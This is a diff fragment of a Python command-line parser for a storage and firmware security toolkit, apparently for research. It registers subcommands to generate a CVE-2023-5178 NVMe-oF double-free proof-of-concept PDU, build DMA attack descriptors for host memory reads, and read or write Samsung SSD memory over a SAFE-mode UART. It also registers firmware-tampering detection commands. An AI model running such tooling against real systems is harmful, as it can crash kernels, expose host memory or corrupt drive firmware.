+    sp = sub.add_parser("nvme-timing-detect", help="Detect NVMe timing contention (simulated)")
+    sp.set_defaults(func=cmd_nvme_timing_detect)
+
+    sp = sub.add_parser("nvme-timing-gc", help="Analyze NVMe completion timing for GC events")
+    sp.set_defaults(func=cmd_nvme_timing_gc)
+
+    # == eNVMe platform commands =================================================
+    sp = sub.add_parser("envme-dma", help="Build eNVMe DMA attack descriptor")
+    sp.add_argument("--host-addr", required=True, help="Host physical address (hex)")
+    sp.add_argument("--size", type=int, default=4096, help="Transfer size (bytes)")
+    sp.add_argument("--direction", choices=["read", "write"], default="read")
+    sp.set_defaults(func=cmd_envme_dma)
+
+    sp = sub.add_parser("envme-scan", help="Model host memory scan via eNVMe")
+    sp.add_argument("--chunk", type=int, default=4096, help="Scan chunk size")
+    sp.add_argument("--pages", type=int, default=256, help="Max pages to scan")
+    sp.set_defaults(func=cmd_envme_scan)
+
+    sp = sub.add_parser("envme-compat", help="Check eNVMe platform compatibility")
+    sp.add_argument("--file", help="NVMe Identify Controller data (4096 bytes)")
+    sp.set_defaults(func=cmd_envme_compat)
+
+    # == NVMe-oF commands ========================================================
+    sp = sub.add_parser("nvmeof-check-kernel", help="Check kernel for CVE-2023-5178 vulnerability")
+    sp.add_argument("--kernel", default="6.7", help="Kernel version string")
+    sp.set_defaults(func=cmd_nvmeof_check_kernel)
+
+    sp = sub.add_parser("nvmeof-build-icreq", help="Build NVMe-oF TCP ICReq PDU")
+    sp.add_argument("--hdgst", action="store_true", help="Enable header digest")
+    sp.add_argument("--ddgst", action="store_true", help="Enable data digest")
+    sp.add_argument(
+        "--maxh2cdata",
+        type=lambda x: int(x, 0),
+        default=0x100000,
+        help="Max host-to-controller data",
+    )
+    sp.set_defaults(func=cmd_nvmeof_build_icreq)
+
+    sp = sub.add_parser("nvmeof-poc", help="Generate CVE-2023-5178 double-free PoC PDU")
+    sp.set_defaults(func=cmd_nvmeof_poc)
+
+    # == Firmware detection commands ===========================================
+    sp = sub.add_parser(
+        "fwdetect-current", help="Detect FW modification via current draw analysis"
+    )
+    sp.add_argument("--current", type=float, help="Measured current (mA)")
+    sp.add_argument("--baseline", type=float, help="Baseline current (mA)")
+    sp.set_defaults(func=cmd_fwdetect_current)
+
+    sp = sub.add_parser("fwdetect-timing", help="Detect FW modification via timing analysis")
+    sp.add_argument("--baseline", type=float, help="Baseline time (us)")
+    sp.add_argument("--modified", action="store_true", help="Simulate modified firmware timing")
+    sp.set_defaults(func=cmd_fwdetect_timing)
+
+    sp = sub.add_parser("fwdetect-verify", help="Verify firmware checksums")
+    sp.add_argument("file", help="Firmware image")
+    sp.add_argument(
+        "--vendor", default="auto", help="Firmware vendor (wd/seagate/samsung/toshiba)"
+    )
+    sp.set_defaults(func=cmd_fwdetect_verify)
+
+    sp = sub.add_parser("fwdetect-report", help="Comprehensive firmware integrity report")
+    sp.add_argument("file", help="Firmware image")
+    sp.add_argument(
+        "--vendor", default="auto", help="Firmware vendor (wd/seagate/samsung/toshiba)"
+    )
+    sp.set_defaults(func=cmd_fwdetect_report)
+
+    # == Samsung MEX (840 EVO) - SAFE-mode UART commands =====================
+    def add_uart(p):
+        p.add_argument("--port", required=True, help="Serial port, e.g. /dev/ttyUSB0 or COM3")
+        p.add_argument("--timeout", type=float, default=2.0)
+
+    sp = sub.add_parser("samsung-safe-shell", help="Interactive SAFE-mode UART shell (rr/rw)")
+    add_uart(sp)
+    sp.set_defaults(func=cmd_samsung_safe_shell)
+
+    sp = sub.add_parser("samsung-safe-read", help="Read word(s) via SAFE-mode UART (rr command)")
+    add_uart(sp)
+    sp.add_argument("--addr", required=True, help="Address (hex)")
+    sp.add_argument(
+        "--size",
+        type=lambda x: int(x, 0),
+        default=4,
+        help="Bytes to read (default 4; multiples of 4)",
+    )
+    sp.add_argument("-o", "--output", help="Save raw bytes to file")
+    sp.set_defaults(func=cmd_samsung_safe_read)
+
+    sp = sub.add_parser("samsung-safe-write", help="Write word via SAFE-mode UART (rw command)")
+    add_uart(sp)
+    sp.add_argument("--addr", required=True, help="Address (hex)")
+    sp.add_argument("--value", required=True, help="32-bit value (hex)")
+    sp.add_argument("--verify", action="store_true", help="Read back and confirm write")
+    sp.set_defaults(func=cmd_samsung_safe_write)
+
+    return p
+
+
+def main():
+    parser = build_parser()
+    args = parser.parse_args()
+    try:
+        args.func(args)
+    except KeyboardInterrupt:
+        warn("Interrupted")
+    except ATAError as e:
+        err(f"ATA error: {e}")
+        sys.exit(1)
+    except Exception as e:
+        err(f"Unexpected error: {e}")
+        raise
